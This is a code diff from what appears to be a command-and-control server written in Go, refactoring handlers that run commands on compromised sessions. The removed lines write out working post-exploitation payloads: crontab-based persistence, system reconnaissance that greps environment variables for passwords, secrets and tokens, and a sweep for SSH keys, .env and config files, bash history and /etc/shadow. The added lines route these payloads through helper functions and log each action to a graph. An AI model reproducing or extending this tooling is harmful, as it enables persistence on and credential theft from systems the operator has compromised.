@@ -90,9 +90,7 @@ func (s *Server) c2Schedule(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "session_id 必填")
 		return
 	}
-	var cmd string
-	switch b.Action {
-	case "add":
+	if b.Action == "add" {
 		if b.IntervalSec < 10 {
 			writeErr(w, 400, "间隔最少 10 秒")
 			return
@@ -101,15 +99,9 @@ func (s *Server) c2Schedule(w http.ResponseWriter, r *http.Request) {
 			writeErr(w, 400, "命令必填")
 			return
 		}
-		cmd = fmt.Sprintf(`(crontab -l 2>/dev/null | grep -v 'FORANG_SCH'; echo '*/%d * * * * %s # FORANG_SCH') | crontab -`,
-			b.IntervalSec/60, b.Cmd)
-	case "ls":
-		cmd = `crontab -l 2>/dev/null | grep FORANG_SCH | nl`
-	case "rm":
-		cmd = fmt.Sprintf(`crontab -l 2>/dev/null | sed '%dd' | crontab -; echo "job %d removed"`, b.JobID, b.JobID)
-	case "clear":
-		cmd = `crontab -l 2>/dev/null | grep -v FORANG_SCH | crontab -; echo "cleared"`
-	default:
+	}
+	cmd := c2ScheduleCmd(s.c2IsWin(r.Context(), b.SessionID), b.Action, b.IntervalSec, b.Cmd, b.JobID)
+	if cmd == "" {
 		writeErr(w, 400, "action: add/ls/rm/clear")
 		return
 	}
@@ -119,6 +111,7 @@ func (s *Server) c2Schedule(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	s.c2Audit(b.SessionID, "", "schedule_"+b.Action, fmt.Sprintf("interval=%d cmd=%s", b.IntervalSec, b.Cmd))
+	s.c2GraphAction(b.SessionID, "schedule", "定时任务 "+b.Action+"："+truncateStr(b.Cmd, 60), result, err == nil)
 	writeJSON(w, 200, map[string]any{"data": map[string]any{"output": result}})
 }
 
@@ -170,21 +163,7 @@ func (s *Server) c2Sysinfo(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "session_id 必填")
 		return
 	}
-	cmds := []string{
-		"uname -a",
-		"cat /etc/os-release 2>/dev/null | head -5",
-		"id && whoami",
-		"ip -4 addr show 2>/dev/null || ifconfig",
-		"cat /etc/resolv.conf 2>/dev/null | head -5",
-		"ps aux --sort=-%cpu | head -20",
-		"netstat -tlnp 2>/dev/null | head -20",
-		"df -h / /tmp 2>/dev/null",
-		"free -m 2>/dev/null",
-		"crontab -l 2>/dev/null | head -10",
-		"systemctl list-units --type=service --state=running 2>/dev/null | head -15",
-		"docker ps 2>/dev/null | head -10",
-		"env | grep -iE 'PASS|SECRET|TOKEN|KEY' | head -10",
-	}
+	cmds := c2SysinfoCmds(s.c2IsWin(r.Context(), b.SessionID))
 	var sb strings.Builder
 	sb.WriteString("===== 系统信息快照 =====\n\n")
 	for _, c := range cmds {
@@ -196,6 +175,7 @@ func (s *Server) c2Sysinfo(w http.ResponseWriter, r *http.Request) {
 		sb.WriteString(fmt.Sprintf("--- %s ---\n%s\n\n", c, out))
 	}
 	s.c2Audit(b.SessionID, "", "sysinfo", "")
+	s.c2GraphAction(b.SessionID, "collect", "系统信息采集", truncateStr(sb.String(), 1500), true)
 	writeJSON(w, 200, map[string]any{"data": map[string]any{"report": sb.String()}})
 }
 
@@ -210,15 +190,7 @@ func (s *Server) c2Sensitive(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, "session_id 必填")
 		return
 	}
-	cmds := []string{
-		"find / -maxdepth 4 \\( -name 'id_rsa' -o -name '*.pem' -o -name '*.key' -o -name '*.p12' \\) -type f 2>/dev/null | head -15",
-		"find / -maxdepth 3 \\( -name '.env' -o -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' \\) 2>/dev/null | head -15",
-		"ls -la ~/.ssh/ 2>/dev/null",
-		"cat ~/.bash_history 2>/dev/null | tail -30",
-		"find /var/log -name '*.log' -newer /etc/hostname 2>/dev/null | head -10",
-		"grep -r 'password' /etc/shadow /etc/sudoers 2>/dev/null | head -5",
-		"find /tmp /var/tmp -type f -executable 2>/dev/null | head -10",
-	}
+	cmds := c2SensitiveCmds(s.c2IsWin(r.Context(), b.SessionID))
 	var sb strings.Builder
 	sb.WriteString("===== 敏感文件扫描 =====\n\n")
 	for _, c := range cmds {
@@ -231,6 +203,7 @@ func (s *Server) c2Sensitive(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	s.c2Audit(b.SessionID, "", "sensitive_scan", "")
+	s.c2GraphAction(b.SessionID, "collect", "敏感文件扫描", truncateStr(sb.String(), 1500), true)
 	writeJSON(w, 200, map[string]any{"data": map[string]any{"report": sb.String()}})
 }
 
